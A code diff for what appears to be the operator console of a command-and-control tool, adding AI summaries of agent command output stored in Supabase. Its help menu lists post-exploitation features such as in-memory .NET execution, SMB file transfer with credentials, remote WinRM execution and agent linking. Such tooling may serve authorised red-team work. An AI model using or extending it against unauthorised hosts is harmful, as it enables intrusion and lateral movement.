@@ -7,6 +7,7 @@ import threading
 from .database import supabase, get_public_url
 from .download import download_file
 from .upload import upload_file
+from .ai_summary import generate_summary  # Import the new AI summary module
 
 # Spinner for visual feedback
 spinner = itertools.cycle(['|', '/', '-', '\\'])
@@ -20,9 +21,12 @@ LIGHT_GREY = '\033[38;5;250m'
 YELLOW = '\033[33m'
 RESET = '\033[0m'
 
+# Add a global setting to toggle AI summary
+AI_SUMMARY = True
+
 def view_command_history(hostname):
     """Fetch and display the command history for a specific host and its SMB agents."""
-    response = supabase.table('py2').select('created_at', 'hostname', 'username', 'ip', 'command', 'output', 'smbhost').or_(
+    response = supabase.table('py2').select('created_at', 'hostname', 'username', 'ip', 'command', 'output', 'smbhost', 'ai_summary').or_(
         f"hostname.eq.{hostname},smbhost.eq.{hostname}"
     ).order('created_at', desc=False).execute()
 
@@ -40,6 +44,7 @@ def view_command_history(hostname):
         ip = command.get('ip', 'N/A')
         cmd = command['command']
         output = command['output']
+        ai_summary = command.get('ai_summary', 'No summary available')
 
         # Use smbhost if it exists, otherwise use hostname
         if command.get('smbhost'):
@@ -55,6 +60,7 @@ def view_command_history(hostname):
         print(f"{color}Hostname:{RESET} {exec_hostname}")
         print(f"{color}Command:{RESET} {cmd}")
         print(f"{color}Output:{RESET} {output}")
+        print(f"{color}AI Summary:{RESET} {ai_summary}")
         print(f"{PURPLE}{'-' * 50}{RESET}")
 
 def file_exists_in_supabase(bucket_name, storage_path):
@@ -77,6 +83,14 @@ def check_for_completed_commands(command_id, hostname, printed_flag, smbhost):
                 print(f"\n\n{RED}Error:{RESET} Command failed on {GREEN}{display_hostname}{RESET}\n\n {output}")
             else:
                 print(f"\n\nOutput from {GREEN}{display_hostname}{RESET}\n\n {output}\n")
+
+            # Generate AI summary if enabled
+            if AI_SUMMARY:
+                ai_summary = generate_summary(output)
+                if ai_summary:
+                    print(f"\n{BLUE}AI Summary:{RESET} {ai_summary}\n")
+                    supabase.table('py2').update({'ai_summary': ai_summary}).eq('id', command_id).execute()
+
             printed_flag.set()
         return True
     return False
@@ -115,28 +129,28 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
         if command_text == 'help':
             print("\nAvailable Shortcut Commands:")
             for shortcut, command in command_mappings.items():
-                print(f"  {shortcut:<10}               :: {command}")
-            print("  sleep <number>                    :: Set a custom timeout (ex. sleep 5)")
-            print("  download <file_path>              :: Download a file from the asset")
-            print("  upload <local_path> <remote_path> :: Upload a file to the asset")
-            print("  ps                                :: List all processes")
-            print("  ps grep <pattern>                 :: Filter processes by name (Windows API)")
-            print("  ps term <processid>               :: Terminate a process by its process ID")
-            print("  run <path_to_remote_file>         :: Launch a process via Windows API")
-            print("  ls <directory_path>               :: List contents of a directory")
-            print("  whoami                            :: Display user information (on Windows /all)")
-            print("  pwd                               :: Display current working directory")
-            print("  users <group_name>                :: List users in the specified group on Windows host via Windows API")
-            print("  netexec <local_file> <arguments>  :: Run a .NET assembly in-memory")
-            print("  smb write <local_file_path> <remote_smb_path> [username password domain]  :: Write a file to a remote host via SMB protocol")
-            print("  smb get <remote_file_path> <local_file_path> [username password domain]  :: Get a file from a remote host via SMB protocol")
-            print("  winrmexec <remote_host> <command> [username password domain]  :: Execute a command on a remote host via WinRM")
-            print("  link smb agent <ip_address> [username password domain]  :: Link the SMB agent to the current host using the specified IP address, optionally with credentials")
-            print("  unlink smb agent <ip_address>     :: Unlink the SMB agent from the current host using the specified IP address")
-            print("  kill                              :: Terminate the agent")
-            print("  hostname                          :: Retrieve the local hostname using the Windows API")
-            print("  nslookup <hostname>               :: Perform a DNS lookup for the given hostname using the Windows API")
-            print("  exit                              :: Return to main menu\n")
+                print(f" {shortcut:<10}        :: {command}")
+            print(" sleep <number>          :: Set a custom timeout (ex. sleep 5)")
+            print(" download <file_path>       :: Download a file from the asset")
+            print(" upload <local_path> <remote_path> :: Upload a file to the asset")
+            print(" ps                :: List all processes")
+            print(" ps grep <pattern>         :: Filter processes by name (Windows API)")
+            print(" ps term <processid>        :: Terminate a process by its process ID")
+            print(" run <path_to_remote_file>     :: Launch a process via Windows API")
+            print(" ls <directory_path>        :: List contents of a directory")
+            print(" whoami              :: Display user information (on Windows /all)")
+            print(" pwd                :: Display current working directory")
+            print(" users <group_name>        :: List users in the specified group on Windows host via Windows API")
+            print(" netexec <local_file> <arguments> :: Run a .NET assembly in-memory")
+            print(" smb write <local_file_path> <remote_smb_path> [username password domain] :: Write a file to a remote host via SMB protocol")
+            print(" smb get <remote_file_path> <local_file_path> [username password domain] :: Get a file from a remote host via SMB protocol")
+            print(" winrmexec <remote_host> <command> [username password domain] :: Execute a command on a remote host via WinRM")
+            print(" link smb agent <ip_address> [username password domain] :: Link the SMB agent to the current host using the specified IP address, optionally with credentials")
+            print(" unlink smb agent <ip_address>   :: Unlink the SMB agent from the current host using the specified IP address")
+            print(" kill               :: Terminate the agent")
+            print(" hostname             :: Retrieve the local hostname using the Windows API")
+            print(" nslookup <hostname>        :: Perform a DNS lookup for the given hostname using the Windows API")
+            print(" exit               :: Return to main menu\n")
             continue
 
         if command_text == 'exit':
@@ -410,6 +424,14 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
                         print(f"\n\n{RED}Error:{RESET} Command failed on {GREEN}{display_hostname}{RESET}\n\n {output}")
                     else:
                         print(f"\n\nOutput from {GREEN}{display_hostname}{RESET}\n\n {output}\n")
+
+                    # Generate AI summary if enabled
+                    if AI_SUMMARY:
+                        ai_summary = generate_summary(output)
+                        if ai_summary:
+                            print(f"\n{BLUE}AI Summary:{RESET} {ai_summary}\n")
+                            supabase.table('py2').update({'ai_summary': ai_summary}).eq('id', command_id).execute()
+
                     printed_flag.set()
                 break
 
